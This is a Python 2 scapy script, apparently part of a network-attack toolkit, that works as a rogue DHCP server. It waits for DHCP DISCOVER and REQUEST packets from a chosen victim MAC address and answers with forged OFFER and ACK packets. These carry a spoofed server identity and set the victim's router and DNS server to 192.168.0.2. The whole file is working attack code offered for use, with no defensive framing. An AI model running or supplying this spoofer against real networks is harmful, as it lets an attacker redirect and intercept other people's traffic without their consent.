from base import Base
from sys import exit
from argparse import ArgumentParser
from scapy.all import *

Base.check_user()

parser = ArgumentParser(description='DHCP Reply (Offer and Ack) sender')
parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
parser.add_argument('-m', '--mac', type=str, required=True, help='Set target client mac address')
args = parser.parse_args()

current_network_interface = ""
if args.interface is None:
    current_network_interface = Base.netiface_selection()
else:
    current_network_interface = args.interface

target_mac_address = ""
if args.mac is None:
    print "Please set client target mac address!"
    exit(1)
else:
    target_mac_address = args.mac.lower()


def make_dhcp_offer_packet(transaction_id):
    return (Ether(src='c4:a8:1d:8a:f9:b0', dst=target_mac_address) /
                    IP(src="192.168.0.254", dst='255.255.255.255') /
                    UDP(sport=67, dport=68) /
                    BOOTP(op='BOOTREPLY', chaddr=target_mac_address, yiaddr='192.168.0.250', siaddr='192.168.0.254',
                          xid=transaction_id) /
                    DHCP(options=[("message-type", "offer"),
                                  ('server_id', '192.168.0.254'),
                                  ('subnet_mask', '255.255.255.0'),
                                  ('router', '192.168.0.2'),
                                  ('lease_time', 172800),
                                  ('dns', '192.168.0.2'),
                                  "end"]))


def make_dhcp_ack_packet(transaction_id, requested_ip):
    return (Ether(src='c4:a8:1d:8a:f9:b0', dst=target_mac_address) /
                  IP(src="192.168.0.254", dst=requested_ip) /
                  UDP(sport=67, dport=68) /
                  BOOTP(op='BOOTREPLY', chaddr=target_mac_address, yiaddr=requested_ip, siaddr='192.168.0.254',
                        xid=transaction_id) /
                  DHCP(options=[("message-type", "ack"),
                                ('server_id', '192.168.0.254'),
                                ('subnet_mask', '255.255.255.0'),
                                ('router', '192.168.0.2'),
                                ('lease_time', 172800),
                                ('domain_name_server', '192.168.0.2'),
                                "end"]))


def dhcp_reply(request):
    if request.haslayer(DHCP):
        transaction_id = request[BOOTP].xid

        if request[DHCP].options[0][1] == 1:
            print "DHCP DISCOVER from: " + target_mac_address + " transaction id: " + hex(transaction_id)
            offer_packet = make_dhcp_offer_packet(transaction_id)
            sendp(offer_packet, iface=current_network_interface, verbose=False)

        if request[DHCP].options[0][1] == 3:
            print "DHCP REQUEST from:  " + target_mac_address + " transaction id: " + hex(transaction_id)
            ack_packet = make_dhcp_ack_packet(transaction_id, str(request[DHCP].options[2][1]))
            sendp(ack_packet, iface=current_network_interface, verbose=False)


if __name__ == "__main__":
    print "Waiting for a DHCP DISCOVER or DHCP REQUEST from mac: " + target_mac_address + " ..."
    sniff(lfilter=lambda d: d.src == target_mac_address,
          filter="udp and src port 68 and dst port 67 and src host 0.0.0.0 and dst host 255.255.255.255",
          prn=dhcp_reply, iface=current_network_interface)
